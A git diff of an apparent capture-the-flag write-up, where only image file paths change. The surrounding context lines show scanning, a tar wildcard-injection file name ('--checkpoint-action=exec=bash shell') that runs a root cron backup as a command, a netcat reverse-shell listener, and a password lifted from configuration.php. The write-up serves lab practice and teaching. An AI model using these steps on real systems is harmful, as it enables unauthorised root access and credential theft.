@@ -6,7 +6,7 @@
 nmap -A 10.10.13.172
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>
 
 ```
 smbclient -L //10.10.13.172
@@ -123,13 +123,13 @@ stty raw -echo;fg
 
 There is a backup script that is ran every minute by root which backs up /var/www/html
 
-<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>
 
 ****
 
-<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -152,7 +152,7 @@ touch /var/www/html/--checkpoint-action=exec=bash\ shell
 nc -nvlp 1338
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is a password in the configuration file, it does not work for root but we see in the home directory another user called jjameson
 
@@ -160,7 +160,7 @@ There is a password in the configuration file, it does not work for root but we 
 cat /var/www/html/configuration.php
 ```
 
-<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can login as jjameson&#x20;
 
